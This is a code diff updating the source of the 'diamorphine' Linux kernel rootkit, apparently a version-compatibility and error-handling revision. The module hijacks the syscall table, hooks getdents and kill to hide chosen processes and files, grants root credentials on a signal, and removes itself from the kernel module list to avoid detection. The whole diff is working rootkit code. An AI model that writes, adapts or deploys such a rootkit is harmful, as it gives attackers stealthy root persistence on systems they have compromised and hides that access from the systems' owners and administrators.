@@ -1,21 +1,12 @@
 #include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/unistd.h>
-#include <asm/pgtable.h>
-#include <linux/slab.h>
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
-#include <linux/sched.h>
 #include <linux/fdtable.h>
-#include <linux/fs.h>
 #include <linux/proc_fs.h>
-
-struct linux_dirent {
-	unsigned long	d_ino;
-	unsigned long	d_off;
-	unsigned short	d_reclen;
-	char		d_name[1];
-};
+#include <linux/proc_ns.h>
+#include <linux/slab.h>
+#include <linux/version.h> 
+#include "diamorphine.h"
 
 static pte_t *pte;
 static unsigned long *sys_call_table;
@@ -28,13 +19,6 @@ orig_getdents_t orig_getdents;
 orig_getdents64_t orig_getdents64;
 orig_kill_t orig_kill;
 
-#ifdef __x86_64__
-	#define START_MEM 0xffffffff81000000
-	#define END_MEM 0xffffffff81fffffff //0xffffffffa2000000
-#else
-	#define START_MEM 0xc0000000
-	#define END_MEM 0xd0000000
-#endif
 unsigned long *
 get_syscall_table_bf(void)
 {
@@ -50,7 +34,6 @@ get_syscall_table_bf(void)
 	return NULL;
 }
 
-#define MAGIC_PREFIX "diamorphine"
 struct task_struct *
 find_task(pid_t pid)
 {
@@ -62,7 +45,6 @@ find_task(pid_t pid)
 	return NULL;
 }
 
-#define PF_INVISIBLE 0x10000000
 int
 is_invisible(pid_t pid)
 {
@@ -78,7 +60,7 @@ asmlinkage int
 hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 	unsigned int count)
 {
-	int ret = orig_getdents64(fd, dirent, count); 
+	int ret = orig_getdents64(fd, dirent, count), err; 
 	unsigned short proc = 0;
 	unsigned long off = 0;
 	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
@@ -91,7 +73,9 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 	if (kdirent == NULL)
 		return ret;
 
-	copy_from_user(kdirent, dirent, ret);
+	err = copy_from_user(kdirent, dirent, ret);
+	if (err)
+		goto out;
 
 	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
 
@@ -107,7 +91,8 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
 			if (dir == kdirent) {
 				ret -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, ret);
+//				memmove(dir, (void *)dir + dir->d_reclen, ret);
+				dir = (void *)dir + dir->d_reclen;
 				continue;
 			}
 			prev->d_reclen += dir->d_reclen;
@@ -115,7 +100,10 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 		prev = dir;
 		off += dir->d_reclen;
 	}
-	copy_to_user(dirent, kdirent, ret);
+	err = copy_to_user(dirent, kdirent, ret);
+	if (err)
+		goto out;
+out:
 	kfree(kdirent);
 	return ret;
 }
@@ -124,7 +112,7 @@ asmlinkage int
 hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 	unsigned int count)
 {
-	int ret = orig_getdents(fd, dirent, count);
+	int ret = orig_getdents(fd, dirent, count), err;
 	unsigned short proc = 0;
 	unsigned long off = 0;
 	struct linux_dirent *dir, *kdirent, *prev = NULL;
@@ -137,7 +125,9 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 	if (kdirent == NULL)
 		return ret;
 
-	copy_from_user(kdirent, dirent, ret);
+	err = copy_from_user(kdirent, dirent, ret);
+	if (err)
+		goto out;
 
 	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
 
@@ -153,7 +143,8 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
 			if (dir == kdirent) {
 				ret -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, ret);
+//				memmove(dir, (void *)dir + dir->d_reclen, ret);
+				dir = (void *)dir + dir->d_reclen;
 				continue;
 			}
 			prev->d_reclen += dir->d_reclen;
@@ -161,7 +152,10 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 			prev = dir;
 		off += dir->d_reclen;
 	}
-	copy_to_user(dirent, kdirent, ret);
+	err = copy_to_user(dirent, kdirent, ret);
+	if (err)
+		goto out;
+out:
 	kfree(kdirent);
 	return ret;
 }
@@ -173,50 +167,55 @@ give_root(void)
 	newcreds = prepare_creds();
 	if (newcreds == NULL)
 		return;	
+	#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 5, 0)
 	newcreds->uid = newcreds->gid = 0;
 	newcreds->euid = newcreds->egid = 0;
 	newcreds->suid = newcreds->sgid = 0;
 	newcreds->fsuid = newcreds->fsgid = 0;
+	#else
+	newcreds->uid.val = newcreds->gid.val = 0;
+	newcreds->euid.val = newcreds->egid.val = 0;
+	newcreds->suid.val = newcreds->sgid.val = 0;
+	newcreds->fsuid.val = newcreds->fsgid.val = 0;
+	#endif
 	commit_creds(newcreds);
 }
 
 static inline void
 tidy(void)
 {
-//        kfree(THIS_MODULE->notes_attrs);
-//        THIS_MODULE->notes_attrs = NULL;
-        kfree(THIS_MODULE->sect_attrs);
-        THIS_MODULE->sect_attrs = NULL;
-//        kfree(THIS_MODULE->mkobj.mp);
-//        THIS_MODULE->mkobj.mp = NULL;
-//        THIS_MODULE->modinfo_attrs->attr.name = NULL;
-//        kfree(THIS_MODULE->mkobj.drivers_dir);
-//        THIS_MODULE->mkobj.drivers_dir = NULL;
+//	kfree(THIS_MODULE->notes_attrs);
+//	THIS_MODULE->notes_attrs = NULL;
+	kfree(THIS_MODULE->sect_attrs);
+	THIS_MODULE->sect_attrs = NULL;
+//	kfree(THIS_MODULE->mkobj.mp);
+//	THIS_MODULE->mkobj.mp = NULL;
+//	THIS_MODULE->modinfo_attrs->attr.name = NULL;
+//	kfree(THIS_MODULE->mkobj.drivers_dir);
+//	THIS_MODULE->mkobj.drivers_dir = NULL;
 }
 
 static struct list_head *module_previous;
 static short module_hidden = 0;
-#define MODULE_NAME "diamorphine"
-void module_show(void)
+void
+module_show(void)
 {
 	list_add(&THIS_MODULE->list, module_previous);
-	kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent,
-			MODULE_NAME);
+	//kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent,
+	//			MODULE_NAME);
 	module_hidden = 0;
 }
 
-void module_hide(void)
+void
+module_hide(void)
 {
 	module_previous = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
-	kobject_del(&THIS_MODULE->mkobj.kobj);
-	list_del(&THIS_MODULE->mkobj.kobj.entry);
+	//kobject_del(&THIS_MODULE->mkobj.kobj);
+	//list_del(&THIS_MODULE->mkobj.kobj.entry);
 	module_hidden = 1;
 }
 
-#define SIGINVIS 31
-#define SIGSUPER 64
-#define SIGMODINVIS 63
 asmlinkage int
 hacked_kill(pid_t pid, int sig)
 {
@@ -256,17 +255,17 @@ unprotect_memory(void)
 }
 
 static int __init
-syshook_init(void)
+diamorphine_init(void)
 {
-        unsigned int level;
+	unsigned int level;
 
 	sys_call_table = get_syscall_table_bf();
 	if (!sys_call_table)
 		return -1;
 
-        pte = lookup_address((unsigned long)sys_call_table, &level);
-        if (!pte)
-                return -1;
+	pte = lookup_address((unsigned long)sys_call_table, &level);
+	if (!pte)
+		return -1;
 
 	module_hide();
 	tidy();
@@ -285,7 +284,7 @@ syshook_init(void)
 }
 
 static void __exit
-syshook_cleanup(void)
+diamorphine_cleanup(void)
 {
 	unprotect_memory();
 	sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
@@ -294,8 +293,8 @@ syshook_cleanup(void)
 	protect_memory();
 }
 
-module_init(syshook_init);
-module_exit(syshook_cleanup);
+module_init(diamorphine_init);
+module_exit(diamorphine_cleanup);
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("m0nad");
